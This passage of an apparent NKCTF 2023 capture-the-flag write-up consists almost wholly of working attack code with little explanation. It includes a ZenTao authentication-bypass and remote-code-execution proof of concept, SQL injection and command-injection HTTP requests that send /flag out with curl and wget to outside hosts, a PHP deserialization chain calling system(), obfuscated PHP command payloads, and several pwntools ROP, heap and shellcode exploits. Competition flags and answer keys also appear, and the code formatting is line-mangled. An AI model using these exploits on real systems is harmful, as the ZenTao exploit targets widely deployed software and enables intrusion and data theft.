ilter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&cmd=("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%03%01%08%00%00%06%0c%01%07"^"%60%60%7c%20%2f%60%60%60%60");
<?php
class Welcome{ public $name; public $arg;}
function waf($string){ if(preg_match('/f|l|a|g|*|?/i', $string)){ die("you are bad"); }}class Happy{ public $shell; public $cmd;}class Hell0{ public $func;}
$ha=new Happy();$ha->shell="urldecode";$ha->cmd='system($_POST[1]);';
$he=new Hell0();$he->func=$ha;
$w=new Welcome();$w->name="welcome_to_NKCTF";$w->arg=$he;
echo urlencode(serialize($w));
https://xz.aliyun.com/t/11798#toc-1
https://github.com/webraybtl/zentaopms_poc
# -*- coding: UTF-8 -*-# !/usr/bin/python
'''权限绕过+RCE POC 伪静态传参版禅道系统 影响版本 安全版本开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2'''import requests
proxies = { #"http": "127.0.0.1:
8080", #"https": "127.0.0.1:
8080",}def check(url): # url="http://10.211.55.3:
8008" url1 = url+'/misc-captcha-user.html' # url1 = url+'/index.php?m=misc&f=captcha&sessionVar=user'#非伪静态版本按照此格式传参 # url2 = url+'/index.php?m=block&f=printBlock&id=1&module=my'#可判断验证绕过的链接 url3 = url + 'repo-create.html' url4 = url + 'repo-edit-10000-10000.html' headers={ "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language":"zh-CN,zh;q=0.9", "Cookie":"zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default", }
 headers2 = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default", "Content-Type":"application/x-www-form-urlencoded", "X-Requested-With":"XMLHttpRequest", "Referer":
url+"/repo-edit-1-0.html" }
 data1 = 'product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=' data2 = 'SCM=Subversion&client=`curl -F "filename=@/flag" http://9p9p2b.ceye.io`' # curl -F "filename=@/home/test/file.tar.gz" http://9p9p2b.ceye.io s=requests.session() try: req1 = s.get(url1,timeout=5,verify=False,headers=headers) req3 = s.post(url3,data=data1,timeout=5,verify=False,headers=headers2) req4 = s.post(url4,data=data2,timeout=5,verify=False,headers=headers2) print(req4.text) return True 
except Exception as e: print(e) return Falseif __name__ == '__main__': print(check("http://d8ce6925-25ed-4fd2-ad80-241401adfff8.node.yuzhian.com.cn:
8000/"))
参考：https://xz.aliyun.com/t/8056#toc-4 进行RCE
参考B站视频：https://www.bilibili.com/video/BV1Yc411j7TP
POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=357da909bf07d9414ed4ed0fConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 125
type=login&username=admin';UPDATE ADMINS set PASSWORD = '67f43efc5701784db1504e4993d7e393';-- &password=admin&verifycode=mzxk
POST /service/app/account.php HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36X-Requested-With: XMLHttpRequestAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 56
type=login&username=admin&password=admin&verifycode=zjm6
POST /service/app/tasks.php?type=save_shell HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 111Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:
9080Referer: http://10.9.57.100:
9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close
task_id=&title=test6&exec_cycle=5&week=1&day=3&hour=1&minute=1&shell=wget x.x.x.x:
4041/`cat /flag|base64`
POST /service/app/tasks.php?type=exec_task HTTP/1.1Host: 88ec9874-92ff-4388-be98-d25617ee0278.node2.yuzhian.com.cnContent-Length: 5Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://10.9.57.100:
9080Referer: http://10.9.57.100:
9080/530BC3Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=59896924bf07d94164875decConnection: close
tid=8
NKCTF{23076c1f-15a3-4c80-9436-d5645845d7fd}
https://blog.csdn.net/zip471642048/article/details/121998766
0x00000FF/rensenware_force: rensenWare forcing tool (github.com)
NKCTF{U_R_re411y_g00d_At_p14ying_t0h0u}
from PIL import Image
def decode(im): width,height = im.size lst = [] for y in range(height): for x in range(width): red,green,blue = im.getpixel((x,y)) if(blue | green | red) == 0: break index = (green<<8) + blue lst.append(chr(index)) return ''.join(lst)
if __name__=='__main__':
 all_text = decode(Image.open("out.bmp","r")) with open ("decode.text","w",encoding = "utf-8") as f: f.write(all_text)
https://spammimic.com/decode.shtml
montage *.png -tile 30x6 -geometry +0+0 flag_tmp.pnggaps --image flag_tmp.png　 --size 125 --save#说明一下参数 30x6和125#-tile：设置每行每列的原始图片数量，30x6 表示拼图的宽30张 高6张，这个要结合gaps多尝试几种不同组合才能得到正确的尺寸。#--size: 这里每张图片为125像素
with open("r.txt") as r: red=r.read()with open("g.txt") as g: green=g.read()with open("b.txt") as b: blue = b.read()str=""for i in range(0,148): str+=red[i] str+=green[i] str+=blue[i]print(str)
IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+AES-12
NKCTF{603fcdfc-652b-40e4-90cf-f27c2edc2d9f}
e=65537n = 114101396033690088275999670914803472451228154227614098210572767821433470213124900655723605426526569384342101959232900145334500170690603208327913698128445002527020347955300595384752458477749198178791196660625870659540794807018881780680683388008090434114437818447523471527878292741702348454486217652394664664641N = 1159977299277711167607914893426674454199208605107323826176606074354449015203832606569051328721360397610665453513201486235549374869954501563523028914285006850687275382822302821825953121223999268058107278346499657597050468069712686559045712946025472616754027552629008516489090871415609098178522863027127254404804829735621706042266140637592206366042515190385496909533329383212542170504864473944657824502882014292528444918055958758310544435120502872883857209880723535754528096143707324179005292445100655695427777453144657819474805882956064292780031599790769618615908501966912635232746588639924772530057835864082951499028dP = 33967356791272818610254738927769774016289590226681637441101504040121743937150259930712897925893431093938385216227201268238374281750681609796883676743311872905933219290266120756315613501614208779063819499785817502677885240656957036398336462000771885589364702443157120609506628895933862241269347200444629283263
# t=e*dP-1
# for k in range(1,e):# if t%k==0:# P=(t//k)+1
# if N%P==0:# print(P)
P=37269067352457630263351774206178494913957088859822110344334922741582406663
3576632750017778267445345566529934525770887732758255395539070275277220458844
8929725998468789449650526538407798388258024733397295470464451746999991657489
3996324149548980338301147983367163067556434434982470623587914250041142380667
816331Q=N//P
PR.<x>=Zmod(n)[]f=(x-P)*(x-Q)m=f.small_roots(X=2^300)print(m)
m=152099310694956022622926857538598513541723670773227126074246760446874272165452073476477print(long_to_bytes(m))
NKCTF{nI_k@i_sHi_zhu_j1an_il_Jie_RE_le}
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 1if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') p = process('./pwn')else: gdbOpen = 0 ip = 'node.yuzhian.com.cn' port = 38867 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

debug("b *0x00000000004012F1")shellcode = p8(0x90) * 104 + asm(shellcraft.sh()) p.sendafter("in 5 min!n", shellcode)
p.interactive()
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF("./libc.so.6") p = process('./pwn')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 33627 libc = ELF("./libc.so.6") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

def choose(choice): p.sendlineafter(b"> n", str(choice).encode('ascii'))
pop_rdi = 0x0000000000401573leave_ret = 0x000000000040139Edebug("b *0x000000000040139F")choose(4)p.recvuntil(b'0x')leak = int(p.recv(12), 16) - 0x84420log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))choose(1)p.sendafter(b'comment?n', p64(binsh))choose(2)p.sendafter(b'corment?n', p64(pop_rdi))choose(3)p.sendafter(b'corMenT?n', p64(sys))choose(4)payload = b'a'*0xa + p64(0x0000000000405098) + p64(leave_ret)p.sendafter(b'heart...n', payload)
p.interactive()
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./ez_stack')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') #p = process('./ez_stack')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 35211 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
pop_rdi = 0x0000000000401283pop_rsi = 0x0000000000401281 # pop rsi ; pop r15 ; retsyscall = 0x000000000040114ecsu1 = 0x000000000040127Acsu2 = 0x0000000000401260
debug("b *0x00000000004011F6")payload = b'a'*0x18 + p64(pop_rsi) + p64(0x4040B0)*2 + p64(syscall)payload += p64(csu1) + p64(0) + p64(1) + p64(0x4040B0) + p64(0)*2 + p64(0x4040B8) + p64(csu2)p.sendafter("NKCTF!n", payload)sleep(1)
payload = b'/bin/shx00' + p64(syscall) + b'a'*0x2bp.send(payload)p.interactive()
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./nkctf_message_boards')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') p = process('./nkctf_message_boards') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 34966 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

debug("b *0x0000000000401340")ret = 0x000000000040101apop_rdi = 0x0000000000401413main = 0x00000000004010F0puts_plt = elf.plt['puts']puts_got = elf.got['puts']read_got = elf.got['read']
format = b"%41$pn"p.sendafter(b"name: ", format)p.recvuntil(b'0x')canary = int(p.recv(16), 16)log.info(hex(canary))payload = p64(ret)*30 + p64(main) + p64(canary)p.sendafter(b"the NKCTF: n", payload)format = b"%22$pn"p.sendafter(b"name: ", format)p.recvuntil(b'0x')leak = int(p.recv(12), 16) - 0x1ed6a0sys = leak + libc.sym['system']binsh = leak + next(libc.search(b'/bin/sh'))log.info(hex(leak))payload = p64(ret)*28 + p64(pop_rdi) + p64(binsh) + p64(sys) + p64(canary)p.sendafter(b"the NKCTF: n", payload)
p.interactive()
    #coding:
utf-8
from pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./pwn'elf=ELF(elfelf)context.arch=elf.archgdb_text='''b *$rebase(0x139b) '''
if len(sys.argv)==1 : io=process(elfelf) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
elif sys.argv[1]=='2' : io=process(elfelf) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
else : io=remote('node2.yuzhian.com.cn',32697) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a)
shell='''shl edi,12mov ax,10call:
xor dx,0x9966syscallxchg edi,esixor eax,eaxmov edi,eaxjmp call'''

pay=asm(shell)gdb_attach(io,gdb_text)pause()io.send(pay)sleep(1)shell='''mov rsp,0x9961c00'''
pay='a'*0xe+asm(shell)pay+='x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fxb0x3bx99x0fx05'
io.send(pay)
#NKCTF{4b4e9ac2-8163-4e58-a14b-02c1cb7f7654}# libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-88-0x10
# libc.address=libc_base
# bin_sh_addr=libc.search('/bin/shx00').next()
# system_addr=libc.sym['system']# free_hook_addr=libc.sym['__free_hook']
# success('libc_base:'+hex(libc_base))
# success('heap_base:'+hex(heap_base))

io.interactive()
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/ld-2.32.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') #p = process('./')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 30509 libc = ELF("./libc-2.32.so") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

def choose(choice): p.sendlineafter(b"Your choice: ", str(choice).encode('ascii'))

def add(idx, size): choose(1) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"Size: ") p.sendline(str(size).encode('ascii')) def edit(idx, content): choose(3) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii')) p.recvuntil(b"content: ") p.send(content)

def show(idx): choose(4) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))

def free(idx): choose(2) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))

for i in range(8): add(i, 0x100)add(8, 0x100)for i in range(8): free(i)for i in range(7): add(i, 0x100)add(7, 0xf0)edit(7, b'n')show(7)leak = u64(p.recv(6).ljust(8, b'x00')) - 0x1e3d0alog.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']free_hook = leak + libc.sym['__free_hook']log.info("free_hook==>0x%x" %free_hook)show(6)key = u64(p.recv(5).ljust(8, b'x00'))log.info("key==>0x%x" %key)add(9, 0x78)add(10, 0x60)add(11, 0x60)add(12, 0x60)edit(9, b'a'*0x78 + b'xe1')free(12)free(11)free(10)add(10, 0xd0)edit(10, b'/bin/shx00' + b'a'*0x60 + p64(0x71) + p64(free_hook^key) + b'n')add(13, 0x60)add(14, 0x60)edit(14, p64(sys) + b'n')free(10)debug()p.interactive()
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux',log_level = 'debug')elf = ELF('./pwn')DEBUG = 0if DEBUG: gdbOpen = 1 clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p = process('./pwn')else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 39981 p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")
debug("b *0x00000000004013E1")p.send(b'V2VsY29tZSB0byBOS0NURiE=')sleep(1)p.send(b'dGVsbCB5b3UgYSBzZWNyZXQ6')sleep(1)p.send(b'SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')sleep(1)p.send(b'Y2FuIHlvdSBmaW5kIG1lPw==')
read_plt = elf.plt['read']read_got = elf.got['read']pop_rdi = 0x0000000000401683pop_rsi = 0x0000000000401681csu1 = 0x000000000040167Acsu2 = 0x0000000000401660
payload = b'a'*0x38 + p64(pop_rsi) + p64(0x404100)*2 + p64(read_plt)payload += p64(pop_rsi) + p64(read_got)*2 + p64(read_plt)payload += p64(csu1) + p64(0) + p64(1) + p64(1) + p64(read_got) + p64(0x3b) + p64(read_got) + p64(csu2)payload += p64(csu1) + p64(0) + p64(1) + p64(0x404100) + p64(0) + p64(0) + p64(read_got) + p64(csu2)p.send(payload)sleep(2)p.sendline(b'/bin/shx00')sleep(5)p.send(p8(0xd0))
p.interactive()
#!usr/bin/env python #coding=utf-8
from pwn import *from ctypes import CDLLcontext(arch = 'amd64',os = 'linux', log_level = 'debug')elf = ELF('./pwn02')DEBUG = 0if DEBUG: gdbOpen = 1 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") ld = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so") p = process(argv=[ld.path,elf.path], env={"LD_PRELOAD" : libc.path}) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
else: gdbOpen = 0 ip = 'node2.yuzhian.com.cn' port = 39089 libc = ELF("/home/shoucheng/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so") p = remote(ip, port) clibc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') def debug(info="b main"): if gdbOpen == 1: gdb.attach(p, info) #gdb.attach(p, "b *$rebase(0x)")

def choose(choice): p.sendlineafter(b"Choice:", str(choice).encode('ascii'))

def add(size, content): choose(1) p.recvuntil(b"size:") p.sendline(str(size).encode('ascii')) p.recvuntil(b"content:") p.send(content)
def show(idx): choose(2) p.recvuntil(b"index:") p.sendline(str(idx).encode('ascii'))

def free(idx): choose(3) p.recvuntil(b"index: ") p.sendline(str(idx).encode('ascii'))

    #prepare 0x140 size unsorted binadd(0x37,b'x00'*0x37)#idx 0 0x40add(0x37,b'x01'*0x37)#idx 1 0x80add(0x37,b'x02'*0x37)#idx 2 0xc0add(0x37,b'x03'*0x37)#idx 3 0x100 add(0x37,b'x00'*0x37)#idx 4 0x140
    #prepare a chunkadd(0x37,b'x00'*0x37)#idx 5
    #prepare chunks between idx 5 and top_chunk.add(0x37,b'x06'*0x37)#idx 6add(0x37,b'x07'*0x37)#idx 7add(0x37,b'x06'*0x37)#idx 8add(0x37,b'x07'*0x37)#idx 9add(0x37,b'x06'*0x37)#idx 10
    #put chunk in fastbin for i in range(5): free(i)

p.sendlineafter(b"Choice:", b'1'*0x500)add(0x28,b'x00'*0x28)
    #madd some chunk.add(0x37,b'x01'*0x37) #idx 1 0x030add(0x17,b'x02'*0x17) #idx 2 0x070add(0x37,b'x03'*0x37) #idx 3 0x090add(0x37,b'x00'*0x37) #idx 4 0x0d0add(0x17,b'x00'*0x17) #idx 11 0x110#put the chunk in fastbin to make overlapped chunk.free(5)free(1)
p.sendlineafter(b"Choice:", b'1'*0x500)add(0x37,b'x01'*0x37) #idx 1 0x030show(2)p.recvuntil(b'Content: ')leak = u64(p.recv(6).ljust(8, b'x00')) - 0x3c4b78log.info("libc_base==>0x%x" %leak)sys = leak + libc.sym['system']_IO_list_all = leak + libc.sym['_IO_list_all']add(0x17,b'x00'*0x17)#idx 5 0x070 = idx 2add(0x17,b'x08'*0x17)#idx 12 0x090free(12)free(5)show(2)p.recvuntil(b'Content: ')heap_base = u64(p.recv(6).ljust(8, b'x00')) - 0x90log.info("heap_base==>0x%x" %heap_base)
free(4)add(0x27,b'x00'*0x18+p64(0x41)+b'x00'*7) # must keep the fastbin size = 0x41fake_file = b'/bin/shx00'+p64(0x61) # fake_filefake_file += p64(0)+p64(_IO_list_all-0x10) #unsorted bin attackfake_file += p64(0)+p64(1) #bypass checkfake_file = fake_file.ljust(0x38,b'x00')add(0x38,fake_file)free(6)payload_1 = b'x00'*0x28 + p64(heap_base+0x1d0) # point to fake_vtablepayload_1 = payload_1.ljust(0x37,b'x00')add(0x37,payload_1)free(7)payload_2 = p64(0)*3 + p64(sys) # fake_vtablepayload_2 = payload_2.ljust(0x37,b'x00')add(0x37,payload_2)debug()
p.sendlineafter(b"Choice:", b'1')p.sendlineafter(b"size:", str(0x20).encode('ascii'))
p.interactive()
NKCTF{W3c0me_to_NKCTF2023}
NKCTF{天津市西青区中北镇万卉路3号NCC新城市中心}
NKCTF{海南省海口市龙华区世纪公园}
NKCTF{贵州省贵阳市南明区遵义路1号}
NKCTF{重庆市渝中区嘉陵江畔戴家巷崖壁步道}
NKCTF{重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮}
NKCTF{广东省江门市蓬江区莲平路}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/5-1679980230.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/6-1679980231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/1-1679980231.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/4-1679980232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/4-1679980232.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/7-1679980233.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679980234.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/5-1679980235.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679980236.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/03/3-1679980237.png)